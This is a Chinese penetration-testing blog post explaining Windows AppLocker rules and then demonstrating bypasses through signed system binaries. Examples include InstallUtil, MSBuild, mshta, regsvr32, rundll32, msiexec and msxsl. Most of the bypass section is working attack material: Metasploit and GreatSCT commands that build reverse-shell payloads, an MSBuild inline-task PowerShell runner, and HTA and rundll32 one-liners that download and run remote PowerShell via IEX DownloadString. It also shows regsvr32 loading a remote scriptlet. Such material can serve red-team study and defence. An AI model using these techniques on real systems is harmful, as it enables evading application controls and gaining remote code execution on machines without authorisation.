原创 lengyi合天智汇  

## 前言  

在提权中我们经常会遇到目标开启了Applocker的情况，本文将以https://github.com/api0cradle/UltimateAppLockerByPassList为参考，讲解Applocker的绕过技术。

这不仅仅是一个applocker的bypass文章，也是一个白名单利用文章。

（若无特殊说明，实验环境一律为windows server 2012 r2）

## 什么是applocker  

AppLocker即“应用程序控制策略”，是Windows
7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能，我们可以使用在services中启用Application
Identity，然后在local security policy中找到Application Control
Policies中看到Applocker选项。

### applocker规则  

默认的Applocker规则支持以下几种：

规则** | 关联的文件格式 ---|--- 可执行文件 | .exe、.com 脚本 | .ps1、.bat、.cmd、.vbs、.js Windows
Installer 文件 | .msi、.msp、.mst 封装应用和封装应用安装程序 | .appx DLL 文件 | .dll、.ocx

.appx并不是所有的applocker都会存在，应根据windows版本来，在win10上，创建applocker规则后会在C:\Windows\System32\AppLocker生产相应的.applocker文件。

### applocker规则条件  

规则条件是用于帮助 AppLocker 标识要应用规则的应用的标准。三个主要规则条件为发布者、路径和文件哈希。

  * 发布者：基于应用的数字签名标识它   

  * 路径：通过应用在计算机文件系统中或网络上的位置来标识它   

  * 文件哈希：表示已标识文件的系统计算的加密哈希   

![v2-7b605eb0e1c69ba9bba242ff6d36aaf6_hd.j](https://pic4.zhimg.com/80/v2-7b605eb0e1c69ba9bba242ff6d36aaf6_hd.jpg)

### AppLocker 默认规则  

在你创建了一个applocker规则后，系统会默认询问你是否添加一条默认规则，如下图所示：

![v2-e0f1d953389b80b7fea9f1d51d9f5d1c_hd.j](https://pic3.zhimg.com/80/v2-e0f1d953389b80b7fea9f1d51d9f5d1c_hd.jpg)

每个规则所对应的默认规则如下：

可执行的默认规则类型包括：

  * 允许本地 Administrators 组的成员运行所有应用。   

  * 允许 Everyone 组的成员运行 Windows 文件夹中的应用。   

  * 允许 Everyone 组的成员运行 Program Files 文件夹中的应用。   

脚本默认规则类型包括：

  * 允许本地 Administrators 组的成员运行所有脚本。   

  * 允许 Everyone 组的成员运行 Program Files 文件夹中的脚本。   

  * 允许 Everyone 组的成员运行 Windows 文件夹中的脚本。   

Windows Installer 默认规则类型包括：

  * 允许本地 Administrators 组的成员运行所有 Windows Installer 文件。   

  * 允许 Everyone 组的成员运行所有已进行数字签名的 Windows Installer 文件。   

  * 允许 Everyone 组的成员运行 Windows\Installer 文件夹中的所有 Windows Installer 文件。   

DLL 默认规则类型：

  * 允许本地 Administrators 组的成员运行所有 DLL。   

  * 允许 Everyone 组的成员运行 Program Files 文件夹中的 DLL。   

  * 允许 Everyone 组的成员运行 Windows 文件夹中的 DLL。   

封装应用默认规则类型：

  * 允许 Everyone 组的成员安装和运行所有已签名的封装应用和封装应用安装程序  

### AppLocker 规则行为  

可将规则配置为使用允许或拒绝操作：

  * 允许。你可以指定允许在你的环境中运行的文件以及所针对的用户或用户组。你还可以配置例外以标识从规则中排除的文件。   

  * 拒绝。你可以指定 not 允许在你的环境中运行的文件以及所针对的用户或用户组。你还可以配置例外以标识从规则中排除的文件。   

![v2-bfdac5430afb2b473c236afeb9f71b3f_hd.j](https://pic1.zhimg.com/80/v2-bfdac5430afb2b473c236afeb9f71b3f_hd.jpg)

### 创建一个applocker规则  

讲了那么多，我们以禁止在桌面上运行exe文件为例，创建一条规则。创建完大体如下：

![v2-a9856c4c9b426eab98235862a2e4f6f9_hd.j](https://pic3.zhimg.com/80/v2-a9856c4c9b426eab98235862a2e4f6f9_hd.jpg)

运行exe测试：

![v2-53a5ca6465c69569fe65bf4392ddfb1a_hd.j](https://pic4.zhimg.com/80/v2-53a5ca6465c69569fe65bf4392ddfb1a_hd.jpg)

系统就会阻止我们运行

## bypass Applocker  

### Installutil.exe  

InstallUtil是.NET
Framework的一部分，是一个命令行程序，它使用户可以通过命令提示符快速安装和卸载应用程序。由于此实用程序是Microsoft签名的二进制文件，因此可以用来绕过AppLocker限制来运行任何.NET可执行文件。该实用程序也位于Windows文件夹内，该文件夹不会应用AppLocker策略，因为需要执行Windows文件夹的内容才能使系统正常运行。

首先我们使用WhiteListEvasion(https://github.com/khr0x40sh/WhiteListEvasion)生成一个模板

python InstallUtil.py --cs_file pentestlab.cs \--exe_file
/root/Desktop/pentestlab.exe --payload windows/meterpreter/reverse_https
--lhost 192.168.0.103 --lport 443

![v2-d17764e4e1f28b5778b7604bb7d7384d_hd.j](https://pic3.zhimg.com/80/v2-d17764e4e1f28b5778b7604bb7d7384d_hd.jpg)

上面的命令将生成一个C＃模板，其中将包含Metasploit ShellCode。

将生成后的文件放到目标中使用下面的方法执行：

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile=
/LogToConsole=false /U /root/payload.exe

当然你也可以是先使用msf生成一个csharp的payload，然后替换模板中的shellcode，然后将cs文件传到目标机。

然后用csc编译我们的脚本：

C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:exeshell.exe
exeshell.cs

![v2-e8b734da1ead1671753036faaa830997_hd.j](https://pic1.zhimg.com/80/v2-e8b734da1ead1671753036faaa830997_hd.jpg)

此时我们执行我们的文件试试：

![v2-64289f5dd8c0c7add70c9d64bf57a99e_hd.j](https://pic1.zhimg.com/80/v2-64289f5dd8c0c7add70c9d64bf57a99e_hd.jpg)

被规则拦截，那么我们使用

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile=
/LogToConsole=false /U exeshell.exe

绕过

![v2-53bc80724bd5dc28e8880a9b8a1adbe4_hd.j](https://pic4.zhimg.com/80/v2-53bc80724bd5dc28e8880a9b8a1adbe4_hd.jpg)

msf成功上线

![v2-7b8488977b6eaf8074a4e7c7afd11c34_hd.j](https://pic3.zhimg.com/80/v2-7b8488977b6eaf8074a4e7c7afd11c34_hd.jpg)

在msf中也有使用InstallUtil.exe进行applocker的bypass模块。

exploit/windows/local/applocker_bypass

原理是一样的

![v2-306277d3475f3bba42e724c9932789a8_hd.j](https://pic4.zhimg.com/80/v2-306277d3475f3bba42e724c9932789a8_hd.jpg)

附带常见的路径：

  * C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe  

  * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe  

  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe  

  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe  

### Msbuild.exe  

MSBuild.exe（Microsoft Build Engine）是Visual
Studio使用的软件构建平台。它采用XML格式的项目文件，这些文件定义了构建各种平台和配置的要求。（引用：MSDN MSBuild）

我们可以使用MSBuild通过受信任的Windows实用工具代理代码执行。.NET版本4中引入的MSBuild内联任务功能允许将C＃代码插入XML项目文件中。内联任务MSBuild将编译并执行内联任务。MSBuild.exe是一个经过签名的Microsoft二进制文件，因此，以这种方式使用它时，它可以执行任意代码，并绕过配置为允许MSBuild.exe执行的应用程序白名单防护.

我们这里直接使用GreatSCT生成一个xml文件。

./GreatSCT.py --ip 192.168.0.106 --port 4444 -t bypass -p
msbuild/meterpreter/rev_tcp.py

![v2-9a30d82d863f42a2178621dcc88417c0_hd.j](https://pic4.zhimg.com/80/v2-9a30d82d863f42a2178621dcc88417c0_hd.jpg)

并且会给我们生成一个rc文件，我们可以使用msfconsole -r 直接启动msf

然后使用msbuild执行，

![v2-2cbc4a869d5bb3ae66abe18fd3ef384e_hd.j](https://pic2.zhimg.com/80/v2-2cbc4a869d5bb3ae66abe18fd3ef384e_hd.jpg)

msf上线：

![v2-9a22556449fcb891dd5e35c6ae72bb79_hd.j](https://pic4.zhimg.com/80/v2-9a22556449fcb891dd5e35c6ae72bb79_hd.jpg)

当然你也可以是使用msf生成一个c#的shellcode然后使用三好学生师傅的模板加载：

https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml

注意将后缀名改为.csproj

除了反弹shell以外我们还可以用它来绕过powershell的限制。

![v2-3a78afe6d3018c83e9a0d3a041ab7f3f_hd.j](https://pic3.zhimg.com/80/v2-3a78afe6d3018c83e9a0d3a041ab7f3f_hd.jpg)

代码如下：

<Project ToolsVersion="4.0"
xmlns="http://schemas.microsoft.com/developer/msbuild/2003"> <!-- This inline
task executes c# code. --> <!--C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml -->
<!-- Author: Casey Smith, Twitter: @subTee --> <!-- License: BSD 3-Clause -->
<Target Name="Hello"> <FragmentExample /> <ClassExample /> </Target>
<UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"
> <ParameterGroup/> <Task> <Using Namespace="System" /> <Using
Namespace="System.IO" /> <Code Type="Fragment" Language="cs"> <![CDATA[
Console.WriteLine("Hello From Fragment"); ]]> </Code> </Task> </UsingTask>
<UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"
> <Task> <Reference Include="System.Management.Automation" /> <Code
Type="Class" Language="cs"> <![CDATA[ using System; using System.IO; using
System.Diagnostics; using System.Reflection; using
System.Runtime.InteropServices; //Add For PowerShell Invocation using
System.Collections.ObjectModel; using System.Management.Automation; using
System.Management.Automation.Runspaces; using System.Text; using
Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class
ClassExample : Task, ITask { public override bool Execute() { while(true) {
Console.Write("PS >"); string x = Console.ReadLine(); try {
Console.WriteLine(RunPSCommand(x)); } catch (Exception e) {
Console.WriteLine(e.Message); } } return true; } //Based on Jared Atkinson's
And Justin Warner's Work public static string RunPSCommand(string cmd) {
//Init stuff Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open(); RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
Pipeline pipeline = runspace.CreatePipeline(); //Add commands
pipeline.Commands.AddScript(cmd); //Prep PS for string output and invoke
pipeline.Commands.Add("Out-String"); Collection<PSObject> results =
pipeline.Invoke(); runspace.Close(); //Convert records to strings
StringBuilder stringBuilder = new StringBuilder(); foreach (PSObject obj in
results) { stringBuilder.Append(obj); } return
stringBuilder.ToString().Trim(); } public static void RunPSFile(string script)
{ PowerShell ps = PowerShell.Create(); ps.AddScript(script).Invoke(); } } ]]>
</Code> </Task> </UsingTask> </Project>

原地址：https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml

![v2-4018e23b055566391d0efe900078eadb_hd.j](https://pic4.zhimg.com/80/v2-4018e23b055566391d0efe900078eadb_hd.jpg)

成功绕过对powershell的限制。

常见路径如下：

  * C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe  

  * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe  

  * C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe  

  * C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe  

  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe  

  * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe  

### Mshta.exe  

mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML
Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。默认已集成在环境变量中。

使用Mshta的方式有很多，我们这里使用msf的exploit/windows/misc/hta_server模块进行测试：

use exploit/windows/misc/hta_server msf exploit(windows/misc/hta_server) > set
srvhost 192.168.1.109 msf exploit(windows/misc/hta_server) > exploit

![v2-5b61754ac67936d767cb84554694df66_hd.j](https://pic2.zhimg.com/80/v2-5b61754ac67936d767cb84554694df66_hd.jpg)

目标机执行：

mshta.exe http://192.168.0.106:8080/JR1gb3TO6.hta

即可上线。

除了这种方法hta还可以使用cobaltstrike 、Setoolkit、Magic
unicorn、Empire、CactusTorch、Koadic、Great SCT等进行上线。

除了本地文件，mshta还支持远程下载的方式执行payload，比如：

mshta.exe
javascript:a=GetObject("script:https://gist.github.com/someone/something.sct").Exec();close();

除了以上的方式，mshta可以用用来执行powershell：

<HTML> <HEAD> <script language="VBScript"> Set objShell =
CreateObject("Wscript.Shell") objShell.Run "powershell -nop -exec bypass -c
IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')" </script>
</HEAD> <BODY> </BODY> </HTML>

即使applocker已经禁止powershell执行了

![v2-3aca1be635ec8ea8cf1913799720aa0e_hd.j](https://pic2.zhimg.com/80/v2-3aca1be635ec8ea8cf1913799720aa0e_hd.jpg)

### InfDefaultInstall.exe  

InfDefaultInstall.exe是一个用来进行inf安装的工具，具有微软签名，存在路径为：

  * C:\Windows\System32\Infdefaultinstall.exe  

  * C:\Windows\SysWOW64\Infdefaultinstall.exe  

我们也可以用它来绕过一些限制。用法就是直接该文件后面跟你的inf文件即可。

它的执行流程如下：

![v2-bace96f60a41e304a857a28c918d6d7c_hd.j](https://pic2.zhimg.com/80/v2-bace96f60a41e304a857a28c918d6d7c_hd.jpg)

作者给出的poc地址如下：

<https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a>

思路也和图中那样，使用shady.inf去调用远程的sct后门。

不过他的调用需要更高的权限，我在win10下运行的截图：

![v2-7ea5710b7f3f06a560248b6533402a62_hd.j](https://pic4.zhimg.com/80/v2-7ea5710b7f3f06a560248b6533402a62_hd.jpg)

### Mavinject.exe  

Mavinject是win10上面自带的windows组件，我们可以用它来进行dll注入，并绕过部分限制。

用法如下：

mavinject32.exe <PID> <PATH DLL>

常见路径如下：

  * C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe  

  * C:\Windows\System32\mavinject.exe  

  * C:\Windows\SysWOW64\mavinject.exe  

但是我本地复现的时候并没有成功注入，但是也没有什么提示，不知道具体原因是什么，版本为： 10.0.15063.0
(WinBuild.160101.0800)

应该是可以成功注入的，附上一张推特大佬成功的图。

![v2-9f7a47126903dec645898157f8c75100_hd.j](https://pic3.zhimg.com/80/v2-9f7a47126903dec645898157f8c75100_hd.jpg)

有兴趣的可以多尝试几个系统。

### MSIEXEC  

MSIEXEC是Microsoft的应用程序，可用于从命令行安装或配置产品。这个其实不是很陌生的了，我之前也写过用它来进行提权的文章。我们假设可以执行msi文件，用它来绕过applocker对powershell的限制。

先用msf生成一个msi文件。

msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi

![v2-815f06e4ebc9a1fbdfccd66b3439a35a_hd.j](https://pic3.zhimg.com/80/v2-815f06e4ebc9a1fbdfccd66b3439a35a_hd.jpg)

windows下执行：

![v2-a881fa6954c5f8cbf33dd7f2177f8aa9_hd.j](https://pic1.zhimg.com/80/v2-a881fa6954c5f8cbf33dd7f2177f8aa9_hd.jpg)

成功绕过。

### msxsl.exe  

msxsl.exe是一个xml的转换器，带有微软数字签名。下载地址如下：

<https://www.microsoft.com/en-us/download/details.aspx?id=21714>

![v2-78e43742cb95f9d8b70edc90a9c8d4b9_hd.j](https://pic1.zhimg.com/80/v2-78e43742cb95f9d8b70edc90a9c8d4b9_hd.jpg)

我们使用3gstudent来尝试绕过applocker对calc的限制，

customers.xml:

<?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="script.xsl" ?>
<customers> <customer> <name>John Smith</name> <address>123 Elm St.</address>
<phone>(123) 456-7890</phone> </customer> <customer> <name>Mary Jones</name>
<address>456 Oak Ave.</address> <phone>(156) 789-0123</phone> </customer>
</customers>

script.xml:

<?xml version='1.0'?> <xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="JScript" implements-prefix="user"> function
xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match="/">
<xsl:value-of select="user:xml(.)"/> </xsl:template> </xsl:stylesheet>

成功绕过：

![v2-e61d70a325d7cadab3f7db1dc0e72915_hd.j](https://pic1.zhimg.com/80/v2-e61d70a325d7cadab3f7db1dc0e72915_hd.jpg)

当然也可以执行我们的shellcode，具体参考：

<https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml>

### Regsv***.exe  

regsv***是Windows命令行实用程序，用于将.dll文件和ActiveX控件注册和注销到注册表中。

文件位置：

  * C:\Windows\System32\regsv***.exe  

  * C:\Windows\SysWOW64\regsv***.exe  

下面为大家演示，绕过applocker上线。

![v2-e97f0da79903b0e51a13080737ab4b14_hd.j](https://pic2.zhimg.com/80/v2-e97f0da79903b0e51a13080737ab4b14_hd.jpg)

![v2-2b13ed1bea192c6d87730b3888943fd5_hd.j](https://pic2.zhimg.com/80/v2-2b13ed1bea192c6d87730b3888943fd5_hd.jpg)

scT文件内容如下：

<?XML version="1.0"?> <scriptlet> <registration progid="Pentest"
classid="{F0001111-0000-0000-0000-0000FEEDACDC}" > <script language="JScript">
<![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ &
pentestlab.exe"); ]]> </script> </registration> </scriptlet>

各参数的含义：

  * 静默不显示任何消息// / s  

  * 不调用DLL注册服务器// / n  

  * 要使用另一个IP地址，因为它不会调用DLL注册服务器// / i  

  * 使用取消注册方法// / u  

除了本地执行，它还支持远程加载：

regsv*** /u /n /s /i:http://ip:port/payload.sct scrobj.dll

sct我们使用ＧreatSct生成即可。

### Rundll32.exe  

Rundll32是一个Microsoft二进制文件，可以执行DLL文件中的代码。由于此实用程序是Windows操作系统的一部分，因此可以用作绕过AppLocker规则或软件限制策略的方法

先生成我们的payload：

![v2-997b78517ddcecab2caefa9e4612da88_hd.j](https://pic1.zhimg.com/80/v2-997b78517ddcecab2caefa9e4612da88_hd.jpg)

目标机执行：

rundll32.exe javascript:"\\..\mshtml,RunHTMLApplication
";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop
-exec bypass -c IEX (New-Object
Net.WebClient).DownloadString('http://ip:port/');"

上线：

![v2-709d0c2cc0c06907e876e5d465b6bbb2_hd.j](https://pic3.zhimg.com/80/v2-709d0c2cc0c06907e876e5d465b6bbb2_hd.jpg)

除了远程之外，也可以本地上线：

rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll

也可以用来绕过对某些软件的限制，比如弹个cmd：

![v2-b5ee8041ea87e79f41b024a45361f4bd_hd.j](https://pic4.zhimg.com/80/v2-b5ee8041ea87e79f41b024a45361f4bd_hd.jpg)

## 后记  

前人载树、后人乘凉。感谢各位师傅的辛苦付出，

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

